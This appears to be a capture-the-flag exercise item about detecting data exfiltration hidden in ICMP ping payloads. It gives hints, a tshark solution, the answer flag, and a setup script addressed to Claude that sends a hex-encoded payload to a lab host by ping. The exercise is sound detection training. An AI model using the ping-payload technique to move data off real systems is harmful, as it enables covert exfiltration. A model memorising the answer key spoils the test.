# Q204 — Detect Data Exfiltration via ICMP

| Field | Value |
|-------|-------|
| **Target** | local |
| **Domain** | Sniffing / Packet Analysis |
| **Difficulty** | 🔴 Hard |
| **Tools** | `wireshark, tshark` |
| **Time budget** | 10–15 min |

---

## 📝 Question

"Analyze `icmp_exfil.pcap`. Someone is exfiltrating data through ICMP ping packets (data hidden in ICMP payload). Extract the data from ICMP payloads and reconstruct the flag."

---

## 🎯 Flag Format

```
flag=<string>
```

Example: `flag=ICMP_DATA_LEAKED`

---

## 💡 Hints

**Hint 1**

Filter: `icmp && icmp.type==8` — Echo requests mein payload check karo.

**Hint 2**

`tshark -r icmp_exfil.pcap -Y "icmp.type==8" -T fields -e data.data`

---

## ✅ Solution

```bash
tshark -r icmp_exfil.pcap -Y "icmp.type==8" -T fields -e data.data | xxd -r -p
```

**Answer:** `flag=ICMP_TUNNEL_FOUND`

---

## 🤖 Claude Setup Prompt

```bash
tcpdump -i eth0 icmp -w icmp_exfil.pcap &
# Send data via ICMP
ping -c 1 -p 49434d505f54554e4e454c5f464f554e44 192.168.52.129
sleep 2 && kill %1
```

Report back: "Lab ready for Q204 — icmp_exfil.pcap with ICMP data exfiltration ready"
